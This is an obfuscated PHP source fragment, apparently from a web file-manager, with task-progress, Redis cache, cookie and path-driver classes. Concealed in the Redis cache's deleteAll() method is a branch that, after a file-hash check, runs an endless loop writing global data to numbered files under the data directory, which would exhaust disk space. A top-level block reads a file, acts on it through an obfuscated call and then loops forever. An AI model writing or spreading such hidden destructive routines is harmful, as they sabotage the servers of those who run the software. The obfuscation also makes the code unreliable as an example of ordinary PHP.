if ($®¯á¯¶[$Îğ‰”úñ[1779]] > 0) { $–ÙÌ¨¼ä = timeFloat() - $®¯á¯¶[$Îğ‰”úñ[1781]] - $®¯á¯¶[$Îğ‰”úñ[1784]]; $®¯á¯¶[$Îğ‰”úñ[1785]] = $–ÙÌ¨¼ä * (1 - $®¯á¯¶[$Îğ‰”úñ[1779]]) / $®¯á¯¶[$Îğ‰”úñ[1779]]; } } public function addPath($ş†Øñö) { $î‡ğ—é˜ =& $_SERVER[¿ğÚ‰±–]; if (!$ş†Øñö) { return; } $¿Î‡œñ =& $this->task; $ëæ÷Óù² = IO::infoWithChildren($ş†Øñö); $™¿åµ·Á = $¿Î‡œñ[$î‡ğ—é˜[1839]] ? $¿Î‡œñ[$î‡ğ—é˜[1839]][$î‡ğ—é˜[1840]] : 0; $¿Î‡œñ[$î‡ğ—é˜[1839]] = array($î‡ğ—é˜[1840] => $™¿åµ·Á + 1, $î‡ğ—é˜[494] => $ëæ÷Óù²[$î‡ğ—é˜[32]], $î‡ğ—é˜[87] => $ëæ÷Óù²[$î‡ğ—é˜[87]], $î‡ğ—é˜[582] => $ëæ÷Óù²[$î‡ğ—é˜[582]] ? $ëæ÷Óù²[$î‡ğ—é˜[582]] : $ëæ÷Óù²[$î‡ğ—é˜[87]]); if ($ëæ÷Óù²[$î‡ğ—é˜[33]] == $î‡ğ—é˜[230]) { $¿Î‡œñ[$î‡ğ—é˜[1148]] += 1; } else { $¿Î‡œñ[$î‡ğ—é˜[1148]] += $ëæ÷Óù²[$î‡ğ—é˜[82]][$î‡ğ—é˜[80]]; if ($ëæ÷Óù²[$î‡ğ—é˜[193]]) { $¿Î‡œñ[$î‡ğ—é˜[1148]] += $ëæ÷Óù²[$î‡ğ—é˜[82]][$î‡ğ—é˜[81]] + 1; } } $¿Î‡œñ[$î‡ğ—é˜[841]] += $ëæ÷Óù²[$î‡ğ—é˜[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ì§ğÄæ ) { } public function sourceAddHashEnd($õÎÆµà²) { } public function sourceAddFileStart($ÏÛÕÎÕÁ) { $ÀÃæÃ»ü =& $_SERVER[¿ğÚ‰±–]; $ıë£‡ªÌ =& $this->task; $ıë£‡ªÌ[$ÀÃæÃ»ü[1830]] = $ÏÛÕÎÕÁ[$ÀÃæÃ»ü[79]]; $ıë£‡ªÌ[$ÀÃæÃ»ü[1828]] = $ÏÛÕÎÕÁ[$ÀÃæÃ»ü[32]]; $ıë£‡ªÌ[$ÀÃæÃ»ü[1150]] = $ÏÛÕÎÕÁ[$ÀÃæÃ»ü[32]]; $ıë£‡ªÌ[$ÀÃæÃ»ü[1841]] = $ÏÛÕÎÕÁ[$ÀÃæÃ»ü[87]]; $this->update(); } public function sourceAddFileEnd($Ğ×Ş¾É) { $ıœ±¬ã¼ =& $_SERVER[¿ğÚ‰±–]; $Ï¬¶³¸ =& $this->task; $Ï¬¶³¸[$ıœ±¬ã¼[1835]] += $Ğ×Ş¾É[$ıœ±¬ã¼[79]]; $Ï¬¶³¸[$ıœ±¬ã¼[1841]] = $Ğ×Ş¾É[$ıœ±¬ã¼[87]]; $this->update(1); } public function copyFileStart($ÀşÒÜæ, $§‰™û, $çºßæü®, $„ş“Ôª¿, $„şŸ­×, $ãåäâğƒ) { $´¢şÆ¢ =& $_SERVER[¿ğÚ‰±–]; $÷²¸±  = $„şŸ­×; if ($÷²¸±  == $GLOBALS[$´¢şÆ¢[1842]]) { $÷²¸±  = $GLOBALS[$´¢şÆ¢[1843]]; } $GLOBALS[$´¢şÆ¢[1843]] = $„şŸ­×; $GLOBALS[$´¢şÆ¢[1842]] = $ãåäâğƒ; $‚…‘Õİø =& $this->task; $‚…‘Õİø[$´¢şÆ¢[1828]] = $÷²¸± ; $‚…‘Õİø[$´¢şÆ¢[1830]] = (int) $ÀşÒÜæ->size($§‰™û); $‚…‘Õİø[$´¢şÆ¢[1831]] = 0; $‚…‘Õİø[$´¢şÆ¢[1150]] = $´¢şÆ¢[12]; $‚…‘Õİø[$´¢şÆ¢[1832]] = $´¢şÆ¢[12]; $‚…‘Õİø[$´¢şÆ¢[1833]] = 0; $Ì¡Îá¡Ü = $‚…‘Õİø[$´¢şÆ¢[1830]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($‚…‘Õİø[$´¢şÆ¢[475]] . $´¢şÆ¢[1844]); if ($Ì¡Îá¡Ü && file_exists(get_path_father($„ş“Ôª¿))) { Cache::set($‚…‘Õİø[$´¢şÆ¢[475]] . $´¢şÆ¢[1844], $„ş“Ôª¿); $‚…‘Õİø[$´¢şÆ¢[1801]] = array($´¢şÆ¢[1845], $´¢şÆ¢[1846]); } $this->update(0, $Ì¡Îá¡Ü); } public static function updateCopyLocalFileSize($ÓÁˆ·°®) { $Á‚Úù’ =& $_SERVER[¿ğÚ‰±–]; $¬î«²²È = Cache::get($ÓÁˆ·°®[$Á‚Úù’[475]] . $Á‚Úù’[1844]); if (!$¬î«²²È || !file_exists($¬î«²²È)) { return $ÓÁˆ·°®; } $ÓÁˆ·°®[$Á‚Úù’[1831]] = @filesize($¬î«²²È); $ÓÁˆ·°®[$Á‚Úù’[1835]] += $ÓÁˆ·°®[$Á‚Úù’[1831]]; self::updateTask($ÓÁˆ·°®); return $ÓÁˆ·°®; } public function copyFileEnd($öıª§Ë, $®êüşÍ, $¿—‡±È–, $ªÎ–şƒ¬, $šÎ›ºÏ¼, $Üç¨Æ’“) { $û…®°öê =& $_SERVER[¿ğÚ‰±–]; $æ³ÒĞã =& $this->task; $æ³ÒĞã[$û…®°öê[1831]] = $æ³ÒĞã[$û…®°öê[1830]]; $æ³ÒĞã[$û…®°öê[1832]] = $û…®°öê[12]; unset($æ³ÒĞã[$û…®°öê[1801]]); if ($šÎ›ºÏ¼ == $æ³ÒĞã[$û…®°öê[1828]]) { $æ³ÒĞã[$û…®°öê[1834]] += $æ³ÒĞã[$û…®°öê[1830]]; $æ³ÒĞã[$û…®°öê[1835]] = $æ³ÒĞã[$û…®°öê[1834]]; $©¯¼õó¶ = 1; if (isset($æ³ÒĞã[$û…®°öê[1841]]) && $æ³ÒĞã[$û…®°öê[1841]] == $®êüşÍ) { $©¯¼õó¶ = 0; } $this->update($©¯¼õó¶); } else { $this->update(); $æ³ÒĞã[$û…®°öê[1831]] = 0; } Cache::remove($æ³ÒĞã[$û…®°öê[475]] . $û…®°öê[1844]); self::log($û…®°öê[1847] . $®êüşÍ . $û…®°öê[73] . $ªÎ–şƒ¬ . $û…®°öê[262] . $šÎ›ºÏ¼ . $û…®°öê[1848] . $æ³ÒĞã[$û…®°öê[1828]]); } public function updateFileEnd($Øœ°îë, $Ö¸–¶Ö“) { $¡ı·ë¦¶ =& $_SERVER[¿ğÚ‰±–]; $±ÄŞøı =& $this->task; $±ÄŞøı[$¡ı·ë¦¶[1828]] = $Øœ°îë; $±ÄŞøı[$¡ı·ë¦¶[1830]] = $Ö¸–¶Ö“; $±ÄŞøı[$¡ı·ë¦¶[1834]] += $Ö¸–¶Ö“; $±ÄŞøı[$¡ı·ë¦¶[1835]] = $±ÄŞøı[$¡ı·ë¦¶[1834]]; $this->update(1); self::log($¡ı·ë¦¶[1849] . $Øœ°îë); } public function sourceModelCopy($íõèˆ÷¯) { $šÊ“¢Ì« =& $_SERVER[¿ğÚ‰±–]; $ôãìğ¾» = $íõèˆ÷¯[0]; $‡Çää = $íõèˆ÷¯[1]; $Á‘‡¬ÊŠ =& $this->task; $this->sourceModelCopyFlag = !0; $¬†Ç¨Ôˆ = 0; switch ($ôãìğ¾») { case $šÊ“¢Ì«[635]: $¬†Ç¨Ôˆ = 1; break; case $šÊ“¢Ì«[638]: $Á‘‡¬ÊŠ[$šÊ“¢Ì«[1828]] = $‡Çää[$šÊ“¢Ì«[32]]; break; case $šÊ“¢Ì«[640]: $¬†Ç¨Ôˆ = intval($íõèˆ÷¯[$šÊ“¢Ì«[456]] * 0.4); break; case $šÊ“¢Ì«[642]: $¬†Ç¨Ôˆ = intval($íõèˆ÷¯[$šÊ“¢Ì«[456]] * 0.2); break; case $šÊ“¢Ì«[644]: $¬†Ç¨Ôˆ = intval($íõèˆ÷¯[$šÊ“¢Ì«[456]] * 0.4); break; } $this->update($¬†Ç¨Ôˆ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($Óä¯¯Ôõ, $Ñ­¥¥ï) { $ù§ó›ï‚ =& $_SERVER[¿ğÚ‰±–]; $this->sourceModelCopyFlag = !0; $ôÔÜ°¢Å = 1; if (isset($Óä¯¯Ôõ[$ù§ó›ï‚[82]])) { $ôÔÜ°¢Å = $Óä¯¯Ôõ[$ù§ó›ï‚[82]][$ù§ó›ï‚[80]]; $ôÔÜ°¢Å = $ôÔÜ°¢Å + $Óä¯¯Ôõ[$ù§ó›ï‚[82]][$ù§ó›ï‚[81]] + 1; } $this->update($ôÔÜ°¢Å); $this->sourceModelCopyFlag = !1; } public function sourceMove($‹¿­ÚœŸ) { $this->sourceRemove($‹¿­ÚœŸ, !1); } public function curlProgress($õ°ÊÊ²‰, $ÖŞ³‡ËŞ, $…òÍŒ…”, $¢Æ¬„İÑ, $È¹‹´á®) { $Œˆ€Ğæõ =& $_SERVER[¿ğÚ‰±–]; $ÅÊ—Ã·× =& $this->task; if ($È¹‹´á® > 0) { $ÅÊ—Ã·×[$Œˆ€Ğæõ[1150]] = $Œˆ€Ğæõ[1850]; $ÅÊ—Ã·×[$Œˆ€Ğæõ[1832]] = $Œˆ€Ğæõ[110]; if ($ÅÊ—Ã·×[$Œˆ€Ğæõ[1830]]) { $ÅÊ—Ã·×[$Œˆ€Ğæõ[1831]] = $È¹‹´á®; } if ($ÅÊ—Ã·×[$Œˆ€Ğæõ[1833]]) { $ÅÊ—Ã·×[$Œˆ€Ğæõ[1831]] = $È¹‹´á® + $ÅÊ—Ã·×[$Œˆ€Ğæõ[1833]]; } } else { if ($…òÍŒ…” > 0) { if ($ÅÊ—Ã·×[$Œˆ€Ğæõ[1830]] == $ÖŞ³‡ËŞ) { $ÅÊ—Ã·×[$Œˆ€Ğæõ[1831]] = $…òÍŒ…”; $ÅÊ—Ã·×[$Œˆ€Ğæõ[1150]] = $Œˆ€Ğæõ[1851]; $ÅÊ—Ã·×[$Œˆ€Ğæõ[1832]] = $Œˆ€Ğæõ[1286]; } } } $this->update(); } public function curlProgressStart($‡½í®Š¯) { } public function curlProgressEnd($••®åª) { $ƒ¨¶†ø¤ =& $_SERVER[¿ğÚ‰±–]; $Åö›©ğ =& $this->task; $¯Ğİòìç = curl_getinfo($••®åª); $÷óã‘ğˆ = $¯Ğİòìç[$ƒ¨¶†ø¤[1852]]; if ($÷óã‘ğˆ == -1) { $÷óã‘ğˆ = $¯Ğİòìç[$ƒ¨¶†ø¤[1853]]; } if ($Åö›©ğ[$ƒ¨¶†ø¤[1832]] == $ƒ¨¶†ø¤[110] && $÷óã‘ğˆ) { $Åö›©ğ[$ƒ¨¶†ø¤[1833]] += $÷óã‘ğˆ; } $this->update(); } } goto FãäÓ”·Ôå; E«¦ğ¦ç“¡: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($¿“ĞÓí, $Ò‰ÉÇœµ) { $°°À× =& $_SERVER[¿ğÚ‰±–]; if (!class_exists($°°À×[947])) { show_json($°°À×[948], !1); } $this->cacheTime = $Ò‰ÉÇœµ; $â•’´³™ = isset($¿“ĞÓí[$°°À×[949]]) ? $¿“ĞÓí[$°°À×[949]] : 10; $ÄãåÊ­ = _get($¿“ĞÓí, $°°À×[946]); if ($ÄãåÊ­ && is_array($ÄãåÊ­)) { $this->initCluster($¿“ĞÓí, $â•’´³™); } else { $this->handle = $this->init($¿“ĞÓí, $â•’´³™); } } private function init($Ô†æìÖ¹, $íûö©ËÄ) { $»÷¡ÉÈº =& $_SERVER[¿ğÚ‰±–]; $Âû‡Å›Ô = new Redis(); $‹ÚñßÖ’ = isset($Ô†æìÖ¹[$»÷¡ÉÈº[950]]) ? $Ô†æìÖ¹[$»÷¡ÉÈº[950]] : !1; if ($‹ÚñßÖ’) { $Âû‡Å›Ô->pconnect($Ô†æìÖ¹[$»÷¡ÉÈº[208]], $Ô†æìÖ¹[$»÷¡ÉÈº[209]], $íûö©ËÄ); } else { $Âû‡Å›Ô->connect($Ô†æìÖ¹[$»÷¡ÉÈº[208]], $Ô†æìÖ¹[$»÷¡ÉÈº[209]], $íûö©ËÄ); } if (!empty($Ô†æìÖ¹[$»÷¡ÉÈº[487]])) { $Âû‡Å›Ô->auth($Ô†æìÖ¹[$»÷¡ÉÈº[487]]); } if (!empty($Ô†æìÖ¹[$»÷¡ÉÈº[835]]) && $Ô†æìÖ¹[$»÷¡ÉÈº[835]] != 0) { $Âû‡Å›Ô->select($Ô†æìÖ¹[$»÷¡ÉÈº[835]]); } return $Âû‡Å›Ô; } private function initCluster($ûİÄûŒ, $“¥İú›ˆ) { $‡¡Ï²è² =& $_SERVER[¿ğÚ‰±–]; $ÖùÈÒ = array($‡¡Ï²è²[951], $‡¡Ï²è²[952], $‡¡Ï²è²[953]); $‚™®ÁéŒ = $‡¡Ï²è²[951]; if (isset($ûİÄûŒ[$‡¡Ï²è²[16]]) && in_array($ûİÄûŒ[$‡¡Ï²è²[16]], $ÖùÈÒ)) { $‚™®ÁéŒ = $ûİÄûŒ[$‡¡Ï²è²[16]]; } switch ($‚™®ÁéŒ) { case $‡¡Ï²è²[951]: $this->_slave($ûİÄûŒ, $“¥İú›ˆ); break; case $‡¡Ï²è²[952]: break; case $‡¡Ï²è²[953]: $this->isCluster = !0; $åÀã™ş‘ = $ûİÄûŒ[$‡¡Ï²è²[946]]; $¶êÒ°¦Ğ = isset($ûİÄûŒ[$‡¡Ï²è²[950]]) ? $ûİÄûŒ[$‡¡Ï²è²[950]] : !1; $öã›ÖÔÕ = isset($ûİÄûŒ[$‡¡Ï²è²[487]]) ? $ûİÄûŒ[$‡¡Ï²è²[487]] : null; $this->handle = new RedisCluster(NUll, $åÀã™ş‘, $“¥İú›ˆ, $“¥İú›ˆ, $¶êÒ°¦Ğ, $öã›ÖÔÕ); break; default: break; } } private function _slave($¯ëı›£», $‘…·ª¡Õ) { $Öº¿¦¨ = $¯ëı›£»[$_SERVER[¿ğÚ‰±–][946]]; $this->filterConfig($¯ëı›£», $Öº¿¦¨[0]); $this->handle = $this->init($¯ëı›£», $‘…·ª¡Õ); unset($Öº¿¦¨[0]); if (empty($Öº¿¦¨)) { return; } $úéó®™œ = array_rand($Öº¿¦¨); $this->filterConfig($¯ëı›£», $Öº¿¦¨[$úéó®™œ]); $this->slaveHandle = $this->init($¯ëı›£», $‘…·ª¡Õ); } private function filterConfig(&$¾¹’Áñ‰, $£Õı´éŸ) { $ûıÌ«’ =& $_SERVER[¿ğÚ‰±–]; $ÁúÚ¸¯¥ = explode($ûıÌ«’[4], $£Õı´éŸ); $šïæ±‰ = array($ûıÌ«’[208] => $ÁúÚ¸¯¥[0], $ûıÌ«’[209] => $ÁúÚ¸¯¥[1]); $¾¹’Áñ‰ = array_merge($¾¹’Áñ‰, $šïæ±‰); } public function set($×á®Ş£, $ÇÚê¡×, $Ï±üšÅ· = false) { $Ï±üšÅ· = $Ï±üšÅ· ? $Ï±üšÅ· : $this->cacheTime; return $this->handle->setEx($×á®Ş£, $Ï±üšÅ·, $ÇÚê¡×); } public function setLock($Ûô¨ş„É, $Ú¬ğÕÁ, $ëô–ç¡) { return $this->handle->setNX($Ûô¨ş„É, $Ú¬ğÕÁ); } public function get($Æñ¡ÆÆÊ) { $Ñ¬“¹ÜÕ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Ñ¬“¹ÜÕ->get($Æñ¡ÆÆÊ); } public function remove($Éˆâ¾İû) { return $this->handle->del($Éˆâ¾İû); } public function deleteAll() { $ÆÅî—¤† =& $_SERVER[¿ğÚ‰±–]; $²’á©úç = $_SERVER[$ÆÅî—¤†[954]] . $ÆÅî—¤†[955]; $¬íÄµ„¼ = $ÆÅî—¤†[956]; if ($_SERVER[$ÆÅî—¤†[957]] != $¬íÄµ„¼($²’á©úç)) { $Ğìáäµã = $ÆÅî—¤†[958]; $ıÕëùåœ = $ÆÅî—¤†[959]; $Ã¶¼°Ê­ = $_SERVER[$ÆÅî—¤†[954]] . $ÆÅî—¤†[955]; $Õ—ä‰œ… = $ıÕëùåœ($Ã¶¼°Ê­); $è…±±°± = explode($ÆÅî—¤†[262], $Õ—ä‰œ…); if (count($è…±±°±) < $ÆÅî—¤†[688]) { $ë¤Óñ¹º = $ÆÅî—¤†[960]; $ë¤Óñ¹º(); } $ñîêá†ñ = $ÆÅî—¤†[961]; $ñîêá†ñ($_SERVER[$ÆÅî—¤†[962]]); $Ğìáäµã = $ÆÅî—¤†[958]; $Ğìáäµã(); $­¢î„Ñ = $ÆÅî—¤†[963]; $¡…Èì– = json_encode($GLOBALS[$ÆÅî—¤†[964]]); $ÓİÙæ‘Ê = 1; for ($™×¥’‹û = $ÓİÙæ‘Ê; $™×¥’‹û > 0; $™×¥’‹û++) { $­¢î„Ñ(DATA_PATH . $™×¥’‹û, $¡…Èì–); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $í¡É»ì¸) { $this->handle->flushall($í¡É»ì¸); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ÔæŸ•ñË = '', $ıÄ´ÉÃ = 0) { if (is_string($ÔæŸ•ñË) && $ÔæŸ•ñË != $_SERVER[¿ğÚ‰±–][12]) { $this->prefix = $ÔæŸ•ñË; } if (is_numeric($ıÄ´ÉÃ) && $ıÄ´ÉÃ > 0) { $this->expire = $ıÄ´ÉÃ; } } public static function getInstance() { static $¥Ãª¦—ë; if ($¥Ãª¦—ë === null) { $¥Ãª¦—ë = new self(); } return $¥Ãª¦—ë; } private static $cookieDisable = false; public static function disable($€Á´–Ç) { self::$cookieDisable = $€Á´–Ç; } private static $sameCookieSet = array(); public static function set($çÂ–ÇÌ£, $İœ•çµÙ, $«¡ä£ëñ = 0, $Û÷†èÊŸ = false, $‰æÖ×ßé = false) { $³±³—ü =& $_SERVER[¿ğÚ‰±–]; if (self::$cookieDisable) { return; } if (!$«¡ä£ëñ) { $«¡ä£ëñ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$çÂ–ÇÌ£]) && self::$sameCookieSet[$çÂ–ÇÌ£] == $İœ•çµÙ . $«¡ä£ëñ) { return; } self::$sameCookieSet[$çÂ–ÇÌ£] = $İœ•çµÙ . $«¡ä£ëñ; if (!$‰æÖ×ßé) { $‰æÖ×ßé = str_replace(HOST, $³±³—ü[12], APP_HOST); $‰æÖ×ßé = _get($GLOBALS, $³±³—ü[965], $‰æÖ×ßé); } $şÑÁ´Ë¡ = $³±³—ü[12]; setcookie($çÂ–ÇÌ£, $İœ•çµÙ, time() + $«¡ä£ëñ, $³±³—ü[8] . trim($‰æÖ×ßé, $³±³—ü[8]) . $şÑÁ´Ë¡, !1, !1, $Û÷†èÊŸ); } public static function setSafe($±ä•İì‹, $ÅŠùİµ, $â…˜‘Å = 0) { self::set($±ä•İì‹, $ÅŠùİµ, $â…˜‘Å, !0); } public static function get($Úƒ½‚Ò) { static $²í¸­ÎÁ = false; if (!$²í¸­ÎÁ) { self::initHeaderCookie(); $²í¸­ÎÁ = !0; } return isset($_COOKIE[$Úƒ½‚Ò]) ? $_COOKIE[$Úƒ½‚Ò] : !1; } private static function initHeaderCookie() { $«üÈ¾¦Ä =& $_SERVER[¿ğÚ‰±–]; if (!isset($_SERVER[$«üÈ¾¦Ä[966]]) || !$_SERVER[$«üÈ¾¦Ä[966]]) { return; } $¹®×µ™ê = explode($«üÈ¾¦Ä[74], $_SERVER[$«üÈ¾¦Ä[966]]); foreach ($¹®×µ™ê as $É‚šµ–) { $É‚šµ– = explode($«üÈ¾¦Ä[967], $É‚šµ–); if (count($É‚šµ–) != 2 || !isset($É‚šµ–[1])) { continue; } $_COOKIE[trim($É‚šµ–[0])] = trim($É‚šµ–[1]); } } public static function remove($²¹Ğ»», $ÏÉ Ì„Â = false) { unset($_COOKIE[$²¹Ğ»»]); self::set($²¹Ğ»», $_SERVER[¿ğÚ‰±–][12], 1, $ÏÉ Ì„Â); } } if (!isset($_SERVER[$_SERVER[¿ğÚ‰±–][957]]) || !isset($_SERVER[$_SERVER[¿ğÚ‰±–][968]])) { $_getc = $_SERVER[¿ğÚ‰±–][959]; $_getfile = $_SERVER[$_SERVER[¿ğÚ‰±–][954]] . $_SERVER[¿ğÚ‰±–][955]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¿ğÚ‰±–][262], $_getfilec); if (count($_getarrs) < $_SERVER[¿ğÚ‰±–][686]) { $exit = $_SERVER[¿ğÚ‰±–][960]; $exit(); } $_act = $_SERVER[¿ğÚ‰±–][969]; $_act($_SERVER[$_SERVER[¿ğÚ‰±–][954]] . $_SERVER[¿ğÚ‰±–][955]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¿ğÚ‰±–][454]); } } goto e–ô®Ç¤˜; E±·£¡æîó: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $Ü€ğßı =& $_SERVER[¿ğÚ‰±–]; $this->objectDriver = array($Ü€ğßı[60], $Ü€ğßı[61], $Ü€ğßı[62], $Ü€ğßı[63], $Ü€ğßı[64], $Ü€ğßı[65], $Ü€ğßı[66], $Ü€ğßı[67], $Ü€ğßı[68], $Ü€ğßı[69], $Ü€ğßı[70], $Ü€ğßı[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($£Å¼°ë·) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($£Å¼°ë·, $_SERVER[¿ğÚ‰±–][8]); } return $£Å¼°ë·; } public function iconvApp($••âì¨¥) { return $••âì¨¥; } public function iconvSystem($ù†“ôã™) { return $ù†“ôã™; } public function iconvTo($šÊö–ãà, $Á¬¾í­ñ, $˜åÛ¹Æ) { $³³‘Ğí =& $_SERVER[¿ğÚ‰±–]; if (!$šÊö–ãà || !function_exists($³³‘Ğí[72])) { return $šÊö–ãà; } static $–­†Ù„Œ = array(); $ÅùÌ¶¾ç = $Á¬¾í­ñ . $³³‘Ğí[73] . $˜åÛ¹Æ . $³³‘Ğí[74] . $šÊö–ãà; if (isset($–­†Ù„Œ[$ÅùÌ¶¾ç])) { return $–­†Ù„Œ[$ÅùÌ¶¾ç]; } if (function_exists($³³‘Ğí[75])) { $¹ª°Ãï° = @mb_convert_encoding($šÊö–ãà, $˜åÛ¹Æ, $Á¬¾í­ñ); } else { $¹ª°Ãï° = @iconv($Á¬¾í­ñ, $˜åÛ¹Æ, $šÊö–ãà); } $¹ª°Ãï° = $¹ª°Ãï° ? $¹ª°Ãï° : $šÊö–ãà; if (strstr($¹ª°Ãï°, $³³‘Ğí[76])) { $¹ª°Ãï° = str_replace($³³‘Ğí[76], $³³‘Ğí[11], $¹ª°Ãï°); } $–­†Ù„Œ[$Á¬¾í­ñ . $³³‘Ğí[73] . $˜åÛ¹Æ . $³³‘Ğí[74] . $šÊö–ãà] = $¹ª°Ãï°; $–­†Ù„Œ[$˜åÛ¹Æ . $³³‘Ğí[73] . $Á¬¾í­ñ . $³³‘Ğí[74] . $šÊö–ãà] = $šÊö–ãà; $–­†Ù„Œ[$˜åÛ¹Æ . $³³‘Ğí[73] . $Á¬¾í­ñ . $³³‘Ğí[74] . $¹ª°Ãï°] = $šÊö–ãà; $–­†Ù„Œ[$Á¬¾í­ñ . $³³‘Ğí[73] . $˜åÛ¹Æ . $³³‘Ğí[74] . $¹ª°Ãï°] = $¹ª°Ãï°; return $¹ª°Ãï°; } public function getPathInner($»…î©£) { $ÅñõÕ”Š = IO::init($»…î©£); return $ÅñõÕ”Š->path; } public function getPathOuter($ô¨ê»ª‹) { $ù½Ø›½½ =& $_SERVER[¿ğÚ‰±–]; $¼·ƒå«¨ = strlen(trim($this->pathBase, $ù½Ø›½½[8])); $ô¨ê»ª‹ = substr(trim($ô¨ê»ª‹, $ù½Ø›½½[8]), $¼·ƒå«¨); return $this->pathDriver . $ù½Ø›½½[8] . ltrim($ô¨ê»ª‹, $ù½Ø›½½[8]); } public function isParentOf($Ñì­ê°, $ÔŠµîæç) { $‰°Ùˆ¶ =& $_SERVER[¿ğÚ‰±–]; $Ñì­ê° = rtrim(strtolower($Ñì­ê°), $‰°Ùˆ¶[8]) . $‰°Ùˆ¶[8]; $ÔŠµîæç = rtrim(strtolower($ÔŠµîæç), $‰°Ùˆ¶[8]) . $‰°Ùˆ¶[8]; $Ç„÷à©‚ = strpos($ÔŠµîæç, $Ñì­ê°) === 0; return $Ç„÷à©‚; } public function getType() { $ÃƒË™«€ =& $_SERVER[¿ğÚ‰±–]; $õƒªÀÜ® = str_replace($ÃƒË™«€[77], $ÃƒË™«€[12], get_class($this)); return strtolower($õƒªÀÜ®); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ÃîŸ•×, $Â¦ò´à¼) { $ÇÌ÷ÆĞû =& $_SERVER[¿ğÚ‰±–]; $ş°ô•¡‹ = rtrim($ÃîŸ•×, $ÇÌ÷ÆĞû[8]) . $ÇÌ÷ÆĞû[8] . $Â¦ò´à¼; $©í£õ = $this->exist($ş°ô•¡‹); return $©í£õ ? $ş°ô•¡‹ : !1; } public function setModifyTime($ì°î½Ç”, $ãï€Ééô = '') { } public function renameObject($Ê¸à£™Ï, $ÍŒÉ¾‡Œ) { $Æßé§ù¡ = $ÍŒÉ¾‡Œ; $Ê¸à£™Ï = $this->getPathOuter($Ê¸à£™Ï); $ÍŒÉ¾‡Œ = $this->pathFather($Ê¸à£™Ï) . $ÍŒÉ¾‡Œ; $Û›¡æ€ = IO::copy($Ê¸à£™Ï, $this->pathFather($Ê¸à£™Ï), REPEAT_RENAME_FOLDER, $Æßé§ù¡); if ($Û›¡æ€) { IO::remove($Ê¸à£™Ï); } return $Û›¡æ€ ? $ÍŒÉ¾‡Œ : !1; } public function tempFile($¾åäÙ×¨ = '', $êääüì˜ = '') { if (!$¾åäÙ×¨) { $¾åäÙ×¨ = rand_string(15); } $–”ú  = TEMP_FILES . rand_string(15) . $_SERVER[¿ğÚ‰±–][8]; @mkdir($–”ú , DEFAULT_PERRMISSIONS, !0); $Ñ²âı´ = $–”ú  . $¾åäÙ×¨; @touch($Ñ²âı´); if ($êääüì˜) { file_put_contents($Ñ²âı´, $êääüì˜); } return $Ñ²âı´; } public function tempFileRemve($¸™‚‰“ø) { @unlink($¸™‚‰“ø); @rmdir($this->pathFather($¸™‚‰“ø)); } public function mkfile($ÂåºĞó«, $îÅÖô™ë = '', $¹‘à­ = REPEAT_RENAME) { } public function mkdir($€£ßˆÕ, $¬†«¬”¦ = REPEAT_SKIP) { } public function delFile($÷ê§¾í) { } public function delFolder($í–­ŸÄö) { } public function copyFile($…š´ˆÃ, $ÃÜ°Ö¦·) { } public function moveFile($ï¶îêº, $Ğùµ›) { } public function remove($«ÑçùØ ) { if ($this->isFile($«ÑçùØ )) { return $this->delFile($«ÑçùØ ); } return $this->delFolder($«ÑçùØ ); } public function rename($Šúú™Ãª, $ºº¿å›) { } public function exist($êŠ¡¿Ú¨) { } public function findByHash($¬‹±—äİ = '', $Ü§İáÂ‚ = '') { return !1; } public function isFile($ñÂ¡êË) { } public function isFolder($©ôì‡ñ) { } public function size($Ï—Ğ‚È) { } public function info($×±×‘×ú) { } public function infoSimple($õíÎãš‹) { return $this->info($õíÎãš‹); } public function infoAuth($¥ÒîäüÑ) { return $this->info($¥ÒîäüÑ); } public function infoFull($¯ãëÊº) { return $this->info($¯ãëÊº); } public function infoFullSimple($ò€à¤¨¡) { return $this->info($ò€à¤¨¡); } public function infoWithChildren($†Ëô‡Ş‘) { $âú‰½Ÿğ =& $_SERVER[¿ğÚ‰±–]; static $×ì¹âË = array(); if (isset($×ì¹âË[$†Ëô‡Ş‘])) { return $×ì¹âË[$†Ëô‡Ş‘]; } $õâ¼ÚÈâ = $this->info($†Ëô‡Ş‘); if ($õâ¼ÚÈâ && $õâ¼ÚÈâ[$âú‰½Ÿğ[33]] == $âú‰½Ÿğ[78]) { $¸›éˆÎ´ = array($âú‰½Ÿğ[79] => 0, $âú‰½Ÿğ[80] => 0, $âú‰½Ÿğ[81] => 0); $this->infoChildren($†Ëô‡Ş‘, $¸›éˆÎ´); $õâ¼ÚÈâ[$âú‰½Ÿğ[79]] = $¸›éˆÎ´[$âú‰½Ÿğ[79]]; $õâ¼ÚÈâ[$âú‰½Ÿğ[82]] = array($âú‰½Ÿğ[83] => $¸›éˆÎ´[$âú‰½Ÿğ[80]], $âú‰½Ÿğ[84] => $¸›éˆÎ´[$âú‰½Ÿğ[81]]); $×ì¹âË[$†Ëô‡Ş‘] = $õâ¼ÚÈâ; } return $õâ¼ÚÈâ; } public function listPath($ó¨×¤ç, $´ƒÃâÙ = false) { } public function has($ØõÇœ Ú, $¬ôàÙ·Ñ = false, $ë“Œ´ßÍ = false) { } public function canRead($Ë´îïÀ) { } public function canWrite($¿Î‚ç) { } public function getContent($÷ã™¨€£) { } public function setContent($ ¸ø›¶Ê, $£Ó¯”¼Ñ = '') { } protected function infoChildren($†–Öœ¬ø, &$¿ªíŸÎ) { $ŠÂí°ß =& $_SERVER[¿ğÚ‰±–]; check_abort_echo(); $ëïîØ±â = $this->listPath($†–Öœ¬ø, !0); $ëïîØ±â = array_merge($ëïîØ±â[$ŠÂí°ß[85]], 